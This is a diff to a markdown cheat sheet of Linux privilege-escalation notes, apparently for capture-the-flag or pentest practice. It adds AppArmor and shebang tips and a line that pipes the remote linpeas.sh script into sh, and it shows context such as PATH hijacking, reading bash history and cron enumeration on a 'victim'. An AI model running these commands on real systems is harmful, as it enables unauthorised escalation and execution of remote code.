@@ -17,6 +17,8 @@
 
 ### Capabilities search 
 `getcap -r / 2>/dev/null`
+* Check `/etc/apparmor.d` directory as it contains resctrictions for **setuid** capabilities.
+* If things don't workout, try to use **shebang** (like "#! /usr/bin/perl") and then run the file like an *executable*. 
 
 ### If perl or python have CAP_SETUID capabilities, run following commands and then execute the file(for python)
 
@@ -34,7 +36,7 @@ Connect to Mysql server from the victim : `mysql -u username -h localhost --pass
 * `df` - to see free disk space of all mounted devices
 
 * Remember `echo "/bin/bash">file`  NOT  `cp /bin/bash ./file`
-
+	
 * `export PATH=/tmp:$PATH` 
 
 * `cat ~/.bash_history`
@@ -58,4 +60,5 @@ cat /etc/crontab
 * `git log -p` : Display changes made in files in each commit.
 * `git reset HEAD^` : Undo the commits (Very Imp).
 
-
+### Linpeas
+`curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh`
